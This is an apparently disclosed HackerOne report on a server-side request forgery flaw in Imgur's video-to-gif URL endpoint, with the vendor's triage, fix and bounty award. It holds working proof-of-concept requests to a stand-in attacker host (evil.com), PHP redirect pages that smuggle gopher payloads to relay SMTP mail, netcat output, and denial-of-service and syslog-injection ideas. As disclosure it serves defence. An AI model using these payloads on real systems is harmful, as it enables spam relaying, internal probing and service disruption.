{"id":115748,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMTU3NDg=","url":"https://hackerone.com/reports/115748","title":"SSRF in https://imgur.com/vidgif/url","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2016-02-10T18:53:22.071Z","submitted_at":"2016-02-10T18:53:22.071Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"aesteral","url":"/aesteral","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/001/049/af64482266c0d55553a4be28706e5396a489ddf3_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":638,"url":"https://hackerone.com/imgur","handle":"imgur","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/638/c66ef01545064639821798ab311aa0063acd8aa7_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/638/c66ef01545064639821798ab311aa0063acd8aa7_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Imgur","twitter_handle":"imgur","website":"http://imgur.com","about":"The most awesome images on the Internet."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2016-03-12T07:09:50.541Z","bug_reporter_agreed_on_going_public_at":"2016-02-11T07:09:45.059Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hello,\n\nShort description\n========\n\nhttps://imgur.com/vidgif/url endpoint is vulnerable to a SSRF vulnerability which allows an attacker to craft connections originating from imgur servers to any destination on the internet and imgur internal network and craft outgoing UDP-packets / telnet-based protocol sessions (for example, to connect to SMTP servers from imgur and send spam).\n\nWhy does the vulnerability exist?\n========\n\nimgur allows users to use 'video-to-gif' service. When a user requests conversion of such a video, imgur's servers perform an HTTP request to a user-supplied URL in order to discover the URL-s content-type and length. It is evident that in order to do so imgur utilizes libcurl. However, imgur does not properly validate user input and does not configure libcurl properly which allows an attacker to use various libcurl protocol wrappers other than http(s). For example, an attacker can supply ftp://test.com/file as an URL and imgur will make such a FTP request.\n\nWhat are the exploitable protocols?\n========\nApparently, imgur performs connections over the following protocols:\n* SSH (scp://, sftp://)\n* POP3\n* IMAP\n* SMTP\n* FTP\n* DICT\n* GOPHER\n* TFTP\n\nSeveral leak information about imgur infrastracture (SSH, DICT), other allow more serious exploits (TFTP, DICT, GOPHER).\n\nWhat are the exploits?\n=========\nSimple exploit: information disclosure (and basic PoC of SSRF)\n----------------\nimgur leaks information about installed software versions via SSH and DICT protocols. An attacker may setup a 'netcat' server and force imgur servers to connect to it and leak version information via a connection string, for example:\n\nRequest: https://imgur.com/vidgif/url?url=sftp://evil.com:11111/\n\n```\nevil.com:$ nc -v -l 11111\nConnection from [54.227.37.234] port 11111 [tcp/*] accepted (family 2, sport 36136)\nSSH-2.0-libssh2_1.4.2\n```\n\nRequest: https://imgur.com/vidgif/url?url=sftp://evil.com:11111/\n\n```\nevil.com:$ nc -v -l 11111\nListening on [0.0.0.0] (family 0, port 11111)\nConnection from [54.166.236.232] port 11111 [tcp/*] accepted (family 2, sport 35789)\nCLIENT libcurl 7.40.0\n\nQUIT\n```\n\nThis way an attacker can discover imgur software versions: libssh2 1.4.2 (probably vulnerable to CVE-2015-1782) and libcurl 7.40.0 (probably vulnerable to CVE-2015-3144, CVE-2015-3237). All there are probable RCEs.\n\nCrafted SMTP connection exploit\n-------------\nCurl's GOPHER protocol implementation allows usage of newlines which allows us to craft any kinds of TELNET chat-sessions and thus craft any kind of TELNET-based protocols request. In this example we will craft a SMTP request to mail.ru.\n\nUnfortunately imgur filters GET['url'] and does not allow us to include newlines in the request, however, imgur's libcurl follows redirects which allows us to send a correct GOPHER payload via HTTP 302.\n\nLet's start with a TELNET chat session example, let's craft a malicious php page:\n\nhttp://evil.com/imgur/gopher1.php\n\n```\n\u003c?php\n        header('Location: gopher://evil.com:12346/_HI%0AMultiline%0Atest');\n?\u003e\n```\n\n```\nevil.com:# nc -v -l 12346\nListening on [0.0.0.0] (family 0, port 12346)\nConnection from [54.227.37.234] port 12346 [tcp/*] accepted (family 2, sport 49398)\nHI\nMultiline\ntest\n```\n\nSo, we can send arbitrary telnet commands and can try to perform an **actual SMTP session and send SPAM from Imgur IPs**\n\nTo demonstrate we will use test.smtp.org testing server.\n\nLet's craft a malicious php page (this one is a working example so I use a real server):\n\nhttp://gradeco.ru/imgur/gopher2.php\n\n```\n\u003c?php\n        $commands = array(\n                'HELO test.org',\n                'MAIL FROM: \u003cimgur@imgur.com\u003e',\n                'RCPT TO: \u003cbit-bucket@test.smtp.org\u003e',\n                'DATA',\n                'Test mail',\n                '.'\n        );\n\n        $payload = implode('%0A', $commands);\n\n        header('Location: gopher://test.smtp.org:25/_'.$payload);\n?\u003e\n```\n\nThis code concats our SMTP command into one line delimited by %0A and forces imgur server to send a 'GOPHER' request to a SMTP server while actually sending a **valid SMTP request**\n\nNow, we should navigate to: https://imgur.com/vidgif/url?url=http://gradeco.ru/imgur/gopher2.php?rand=RAND (rand to prevent caching).\n\nAnd imgur server will connect to test.smtp.org and send an email message! You can check it via smtp log here: http://test.smtp.org/log\n\n```\nFeb 10 18:32:41 z testmail[45856]: NOQUEUE: connect from ec2-54-160-191-72.compute-1.amazonaws.com [54.160.191.72]\nFeb 10 18:32:41 z testmail[45856]: AUTH: available mech=SCRAM-SHA-1 DIGEST-MD5 OTP CRAM-MD5 NTLM LOGIN PLAIN ANONYMOUS, allowed mech=EXTERNAL SCRAM-SHA-1 DIGEST-MD5 CRAM-MD5 PLAIN LOGIN ANONYMOUS\nFeb 10 18:32:41 z testmail[45856]: u1AIWf5H045856: Milter: no active filter\nFeb 10 18:32:41 z testmail[45856]: u1AIWf5H045856: from=\u003cimgur@imgur.com\u003e, size=10, class=0, nrcpts=1, msgid=\u003c201602101832.u1AIWf5H045856@test.smtp.org\u003e, proto=SMTP, daemon=testv4, relay=ec2-54-160-191-72.compute-1.amazonaws.com [54.160.191.72]\nFeb 10 18:32:41 z testmail[45857]: u1AIWf5H045856: alias \u003cbit-bucket@test.smtp.org\u003e =\u003e /dev/null\nFeb 10 18:32:41 z testmail[45857]: u1AIWf5H045856: to=/dev/null, ctladdr=\u003cbit-bucket@test.smtp.org\u003e (26/0), delay=00:00:00, xdelay=00:00:00, mailer=*file*, pri=30386, dsn=2.0.0, stat=Sent\nFeb 10 18:32:41 z testmail[45857]: u1AIWf5H045856: done; delay=00:00:00, ntries=1\n```\n\nCool, now we can send spam from imgur servers :)\n\nSame method can be used to connect to, say, REDIS servers, unavailable from external network.\n\nCrafted UDP connection exploit\n-------------\nWe can send almost arbitrary UDP packets by using TFTP protocol, here is an example:\n\nRequest: https://imgur.com/vidgif/url?url=tftp://evil.com:12346/TESTUDPPACKET\n\n```\nevil.com:# nc -v -u -l 12346\nListening on [0.0.0.0] (family 0, port 12346)\nTESTUDPPACKEToctettsize0blksize512timeout6\n```\n\nThis can be used to craft request to various UDP-services like Memcache or REDIS-UDP.\n\nDenial of service exploit (obviously not tested)\n--------------\nIt seems that imgur servers have VERY long timeout for their curl-requests. An attacker can use iptables' TARPIT target to block requests for a prolonged time and CURL's FTP:// protocol which never timeouts.\n\nAn attacker can send all TCP traffic to port 12345 to TARPIT and the request \n\nhttps://imgur.com/vidgif/url?url=ftp://evil.com:12345/TEST\n\nIn this case, imgur will open an FTP connection from 3 servers (apparently due to retries) and keep it open for a long time (10's of seconds). An attacker can initiate lots of vidgif/url requests to exhaust imgur servers' resources.","vulnerability_information_html":"\u003cp\u003eHello,\u003c/p\u003e\n\n\u003ch1 id=\"short-description\"\u003eShort description\u003c/h1\u003e\n\n\u003cp\u003e\u003ca title=\"https://imgur.com/vidgif/url\" href=\"/redirect?url=https%3A%2F%2Fimgur.com%2Fvidgif%2Furl\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://imgur.com/vidgif/url\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e endpoint is vulnerable to a SSRF vulnerability which allows an attacker to craft connections originating from imgur servers to any destination on the internet and imgur internal network and craft outgoing UDP-packets / telnet-based protocol sessions (for example, to connect to SMTP servers from imgur and send spam).\u003c/p\u003e\n\n\u003ch1 id=\"why-does-the-vulnerability-exist\"\u003eWhy does the vulnerability exist?\u003c/h1\u003e\n\n\u003cp\u003eimgur allows users to use \u0026#39;video-to-gif\u0026#39; service. When a user requests conversion of such a video, imgur\u0026#39;s servers perform an HTTP request to a user-supplied URL in order to discover the URL-s content-type and length. It is evident that in order to do so imgur utilizes libcurl. However, imgur does not properly validate user input and does not configure libcurl properly which allows an attacker to use various libcurl protocol wrappers other than http(s). For example, an attacker can supply \u003ca title=\"ftp://test.com/file\" href=\"/redirect?url=ftp%3A%2F%2Ftest.com%2Ffile\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eftp://test.com/file\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e as an URL and imgur will make such a FTP request.\u003c/p\u003e\n\n\u003ch1 id=\"what-are-the-exploitable-protocols\"\u003eWhat are the exploitable protocols?\u003c/h1\u003e\n\n\u003cp\u003eApparently, imgur performs connections over the following protocols:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eSSH (scp://, sftp://)\u003c/li\u003e\n\u003cli\u003ePOP3\u003c/li\u003e\n\u003cli\u003eIMAP\u003c/li\u003e\n\u003cli\u003eSMTP\u003c/li\u003e\n\u003cli\u003eFTP\u003c/li\u003e\n\u003cli\u003eDICT\u003c/li\u003e\n\u003cli\u003eGOPHER\u003c/li\u003e\n\u003cli\u003eTFTP\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eSeveral leak information about imgur infrastracture (SSH, DICT), other allow more serious exploits (TFTP, DICT, GOPHER).\u003c/p\u003e\n\n\u003ch1 id=\"what-are-the-exploits\"\u003eWhat are the exploits?\u003c/h1\u003e\n\n\u003ch2 id=\"simple-exploit-information-disclosure-and-basic-poc-of-ssrf\"\u003eSimple exploit: information disclosure (and basic PoC of SSRF)\u003c/h2\u003e\n\n\u003cp\u003eimgur leaks information about installed software versions via SSH and DICT protocols. An attacker may setup a \u0026#39;netcat\u0026#39; server and force imgur servers to connect to it and leak version information via a connection string, for example:\u003c/p\u003e\n\n\u003cp\u003eRequest: \u003ca title=\"https://imgur.com/vidgif/url?url=sftp://evil.com:11111/\" href=\"/redirect?url=https%3A%2F%2Fimgur.com%2Fvidgif%2Furl%3Furl%3Dsftp%3A%2F%2Fevil.com%3A11111%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://imgur.com/vidgif/url?url=sftp://evil.com:11111/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eevil.com:$ nc -v -l 11111\nConnection from [54.227.37.234] port 11111 [tcp/*] accepted (family 2, sport 36136)\nSSH-2.0-libssh2_1.4.2\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eRequest: \u003ca title=\"https://imgur.com/vidgif/url?url=sftp://evil.com:11111/\" href=\"/redirect?url=https%3A%2F%2Fimgur.com%2Fvidgif%2Furl%3Furl%3Dsftp%3A%2F%2Fevil.com%3A11111%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://imgur.com/vidgif/url?url=sftp://evil.com:11111/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eevil.com:$ nc -v -l 11111\nListening on [0.0.0.0] (family 0, port 11111)\nConnection from [54.166.236.232] port 11111 [tcp/*] accepted (family 2, sport 35789)\nCLIENT libcurl 7.40.0\n\nQUIT\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThis way an attacker can discover imgur software versions: libssh2 1.4.2 (probably vulnerable to CVE-2015-1782) and libcurl 7.40.0 (probably vulnerable to CVE-2015-3144, CVE-2015-3237). All there are probable RCEs.\u003c/p\u003e\n\n\u003ch2 id=\"crafted-smtp-connection-exploit\"\u003eCrafted SMTP connection exploit\u003c/h2\u003e\n\n\u003cp\u003eCurl\u0026#39;s GOPHER protocol implementation allows usage of newlines which allows us to craft any kinds of TELNET chat-sessions and thus craft any kind of TELNET-based protocols request. In this example we will craft a SMTP request to mail.ru.\u003c/p\u003e\n\n\u003cp\u003eUnfortunately imgur filters GET[\u0026#39;url\u0026#39;] and does not allow us to include newlines in the request, however, imgur\u0026#39;s libcurl follows redirects which allows us to send a correct GOPHER payload via HTTP 302.\u003c/p\u003e\n\n\u003cp\u003eLet\u0026#39;s start with a TELNET chat session example, let\u0026#39;s craft a malicious php page:\u003c/p\u003e\n\n\u003cp\u003e\u003ca title=\"http://evil.com/imgur/gopher1.php\" href=\"/redirect?url=http%3A%2F%2Fevil.com%2Fimgur%2Fgopher1.php\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://evil.com/imgur/gopher1.php\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight php\"\u003e\u003ccode\u003e\u003cspan class=\"cp\"\u003e\u0026lt;?php\u003c/span\u003e\n        \u003cspan class=\"nb\"\u003eheader\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;Location: gopher://evil.com:12346/_HI%0AMultiline%0Atest\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"cp\"\u003e?\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eevil.com:# nc -v -l 12346\nListening on [0.0.0.0] (family 0, port 12346)\nConnection from [54.227.37.234] port 12346 [tcp/*] accepted (family 2, sport 49398)\nHI\nMultiline\ntest\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eSo, we can send arbitrary telnet commands and can try to perform an \u003cstrong\u003eactual SMTP session and send SPAM from Imgur IPs\u003c/strong\u003e\u003c/p\u003e\n\n\u003cp\u003eTo demonstrate we will use test.smtp.org testing server.\u003c/p\u003e\n\n\u003cp\u003eLet\u0026#39;s craft a malicious php page (this one is a working example so I use a real server):\u003c/p\u003e\n\n\u003cp\u003e\u003ca title=\"http://gradeco.ru/imgur/gopher2.php\" href=\"/redirect?url=http%3A%2F%2Fgradeco.ru%2Fimgur%2Fgopher2.php\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://gradeco.ru/imgur/gopher2.php\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight php\"\u003e\u003ccode\u003e\u003cspan class=\"cp\"\u003e\u0026lt;?php\u003c/span\u003e\n        \u003cspan class=\"nv\"\u003e$commands\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003earray\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\n                \u003cspan class=\"s1\"\u003e\u0026#39;HELO test.org\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n                \u003cspan class=\"s1\"\u003e\u0026#39;MAIL FROM: \u0026lt;imgur@imgur.com\u0026gt;\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n                \u003cspan class=\"s1\"\u003e\u0026#39;RCPT TO: \u0026lt;bit-bucket@test.smtp.org\u0026gt;\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n                \u003cspan class=\"s1\"\u003e\u0026#39;DATA\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n                \u003cspan class=\"s1\"\u003e\u0026#39;Test mail\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\n                \u003cspan class=\"s1\"\u003e\u0026#39;.\u0026#39;\u003c/span\u003e\n        \u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\n        \u003cspan class=\"nv\"\u003e$payload\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003eimplode\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;%0A\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nv\"\u003e$commands\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\n        \u003cspan class=\"nb\"\u003eheader\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;Location: gopher://test.smtp.org:25/_\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"nv\"\u003e$payload\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"cp\"\u003e?\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThis code concats our SMTP command into one line delimited by %0A and forces imgur server to send a \u0026#39;GOPHER\u0026#39; request to a SMTP server while actually sending a \u003cstrong\u003evalid SMTP request\u003c/strong\u003e\u003c/p\u003e\n\n\u003cp\u003eNow, we should navigate to: \u003ca title=\"https://imgur.com/vidgif/url?url=http://gradeco.ru/imgur/gopher2.php?rand=RAND\" href=\"/redirect?url=https%3A%2F%2Fimgur.com%2Fvidgif%2Furl%3Furl%3Dhttp%3A%2F%2Fgradeco.ru%2Fimgur%2Fgopher2.php%3Frand%3DRAND\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://imgur.com/vidgif/url?url=http://gradeco.ru/imgur/gopher2.php?rand=RAND\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e (rand to prevent caching).\u003c/p\u003e\n\n\u003cp\u003eAnd imgur server will connect to test.smtp.org and send an email message! You can check it via smtp log here: \u003ca title=\"http://test.smtp.org/log\" href=\"/redirect?url=http%3A%2F%2Ftest.smtp.org%2Flog\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://test.smtp.org/log\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eFeb 10 18:32:41 z testmail[45856]: NOQUEUE: connect from ec2-54-160-191-72.compute-1.amazonaws.com [54.160.191.72]\nFeb 10 18:32:41 z testmail[45856]: AUTH: available mech=SCRAM-SHA-1 DIGEST-MD5 OTP CRAM-MD5 NTLM LOGIN PLAIN ANONYMOUS, allowed mech=EXTERNAL SCRAM-SHA-1 DIGEST-MD5 CRAM-MD5 PLAIN LOGIN ANONYMOUS\nFeb 10 18:32:41 z testmail[45856]: u1AIWf5H045856: Milter: no active filter\nFeb 10 18:32:41 z testmail[45856]: u1AIWf5H045856: from=\u0026lt;imgur@imgur.com\u0026gt;, size=10, class=0, nrcpts=1, msgid=\u0026lt;201602101832.u1AIWf5H045856@test.smtp.org\u0026gt;, proto=SMTP, daemon=testv4, relay=ec2-54-160-191-72.compute-1.amazonaws.com [54.160.191.72]\nFeb 10 18:32:41 z testmail[45857]: u1AIWf5H045856: alias \u0026lt;bit-bucket@test.smtp.org\u0026gt; =\u0026gt; /dev/null\nFeb 10 18:32:41 z testmail[45857]: u1AIWf5H045856: to=/dev/null, ctladdr=\u0026lt;bit-bucket@test.smtp.org\u0026gt; (26/0), delay=00:00:00, xdelay=00:00:00, mailer=*file*, pri=30386, dsn=2.0.0, stat=Sent\nFeb 10 18:32:41 z testmail[45857]: u1AIWf5H045856: done; delay=00:00:00, ntries=1\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eCool, now we can send spam from imgur servers :)\u003c/p\u003e\n\n\u003cp\u003eSame method can be used to connect to, say, REDIS servers, unavailable from external network.\u003c/p\u003e\n\n\u003ch2 id=\"crafted-udp-connection-exploit\"\u003eCrafted UDP connection exploit\u003c/h2\u003e\n\n\u003cp\u003eWe can send almost arbitrary UDP packets by using TFTP protocol, here is an example:\u003c/p\u003e\n\n\u003cp\u003eRequest: \u003ca title=\"https://imgur.com/vidgif/url?url=tftp://evil.com:12346/TESTUDPPACKET\" href=\"/redirect?url=https%3A%2F%2Fimgur.com%2Fvidgif%2Furl%3Furl%3Dtftp%3A%2F%2Fevil.com%3A12346%2FTESTUDPPACKET\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://imgur.com/vidgif/url?url=tftp://evil.com:12346/TESTUDPPACKET\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eevil.com:# nc -v -u -l 12346\nListening on [0.0.0.0] (family 0, port 12346)\nTESTUDPPACKEToctettsize0blksize512timeout6\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThis can be used to craft request to various UDP-services like Memcache or REDIS-UDP.\u003c/p\u003e\n\n\u003ch2 id=\"denial-of-service-exploit-obviously-not-tested\"\u003eDenial of service exploit (obviously not tested)\u003c/h2\u003e\n\n\u003cp\u003eIt seems that imgur servers have VERY long timeout for their curl-requests. An attacker can use iptables\u0026#39; TARPIT target to block requests for a prolonged time and CURL\u0026#39;s FTP:// protocol which never timeouts.\u003c/p\u003e\n\n\u003cp\u003eAn attacker can send all TCP traffic to port 12345 to TARPIT and the request \u003c/p\u003e\n\n\u003cp\u003e\u003ca title=\"https://imgur.com/vidgif/url?url=ftp://evil.com:12345/TEST\" href=\"/redirect?url=https%3A%2F%2Fimgur.com%2Fvidgif%2Furl%3Furl%3Dftp%3A%2F%2Fevil.com%3A12345%2FTEST\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://imgur.com/vidgif/url?url=ftp://evil.com:12345/TEST\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eIn this case, imgur will open an FTP connection from 3 servers (apparently due to retries) and keep it open for a long time (10\u0026#39;s of seconds). An attacker can initiate lots of vidgif/url requests to exhaust imgur servers\u0026#39; resources.\u003c/p\u003e\n","bounty_amount":"2000.0","formatted_bounty":"$2,000","weakness":{"id":48,"name":"Denial of Service"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2016-03-12T07:09:45.469Z","allow_singular_disclosure_after":-151448909.7822513,"singular_disclosure_allowed":true,"vote_count":34,"voters":["irvinlim","hunter","michiel","aesteral","r0x33d","fizhimchik","bogdantcaciuc","anovg","0xsyndr0me","supern0va","and 24 more..."],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":793344,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"There is also a non-tested possibility to append arbitrary lines to syslog by using:\n\nLocation: dict://localhost:514/TEST","markdown_message":"\u003cp\u003eThere is also a non-tested possibility to append arbitrary lines to syslog by using:\u003c/p\u003e\n\n\u003cp\u003eLocation: dict://localhost:514/TEST\u003c/p\u003e\n","automated_response":false,"created_at":"2016-02-10T18:58:08.007Z","updated_at":"2016-02-10T18:58:08.007Z","actor":{"username":"aesteral","cleared":false,"url":"/aesteral","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/049/af64482266c0d55553a4be28706e5396a489ddf3_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"imgur","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":793397,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"We have accepted the report as valid and added an issue in our internal issue tracker for your report. We will update this page when more progress is made. Thanks!","markdown_message":"\u003cp\u003eWe have accepted the report as valid and added an issue in our internal issue tracker for your report. We will update this page when more progress is made. Thanks!\u003c/p\u003e\n","automated_response":false,"created_at":"2016-02-10T19:33:20.562Z","updated_at":"2016-02-10T19:33:20.562Z","actor":{"username":"jacobg","cleared":false,"url":"/jacobg","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"imgur","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":793469,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"We have released a new version that fixes this vulnerability. Thanks for helping make Imgur more secure! ","markdown_message":"\u003cp\u003eWe have released a new version that fixes this vulnerability. Thanks for helping make Imgur more secure! \u003c/p\u003e\n","automated_response":false,"created_at":"2016-02-10T20:35:42.242Z","updated_at":"2016-02-10T20:35:42.242Z","actor":{"username":"jacobg","cleared":false,"url":"/jacobg","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"aesteral","url":"/aesteral"},"genius_execution_id":null,"team_handle":"imgur","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":793471,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@kcramer will follow up with you with bounty. ","markdown_message":"\u003cp\u003e\u003ca href=\"/kcramer\"\u003e@kcramer\u003c/a\u003e will follow up with you with bounty. \u003c/p\u003e\n","automated_response":false,"created_at":"2016-02-10T20:35:56.957Z","updated_at":"2016-02-10T20:35:56.957Z","actor":{"username":"jacobg","cleared":false,"url":"/jacobg","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"imgur","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":793656,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Hi @aesteral, thanks for the report and for doing all the POCs etc. It's really well written and helped us take care of the issue quickly! Hope you keep digging around Imgur!","markdown_message":"\u003cp\u003eHi \u003ca href=\"/aesteral\"\u003e@aesteral\u003c/a\u003e, thanks for the report and for doing all the POCs etc. It\u0026#39;s really well written and helped us take care of the issue quickly! Hope you keep digging around Imgur!\u003c/p\u003e\n","automated_response":false,"created_at":"2016-02-10T23:48:11.501Z","updated_at":"2016-02-10T23:48:11.501Z","actor":{"url":"/imgur","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/638/c66ef01545064639821798ab311aa0063acd8aa7_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Imgur"}},"bounty_amount":"2000.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"imgur","collaborator":{"username":"aesteral","url":"/aesteral"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":793901,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Thanks! Please allow to disclose this. ","markdown_message":"\u003cp\u003eThanks! Please allow to disclose this. \u003c/p\u003e\n","automated_response":false,"created_at":"2016-02-11T07:09:45.106Z","updated_at":"2016-02-11T07:09:45.106Z","first_to_agree":true,"actor":{"username":"aesteral","cleared":false,"url":"/aesteral","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/049/af64482266c0d55553a4be28706e5396a489ddf3_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"imgur","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":794556,"is_internal":false,"editable":false,"type":"Activities::ExternalUserJoined","message":"","markdown_message":"","automated_response":false,"created_at":"2016-02-11T16:34:23.806Z","updated_at":"2016-02-11T16:34:23.806Z","additional_data":{"duplicate_report_id":115857},"actor":{"username":"sl1m","cleared":false,"url":"/sl1m","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/055/764/c20a4946f86dd4b0d35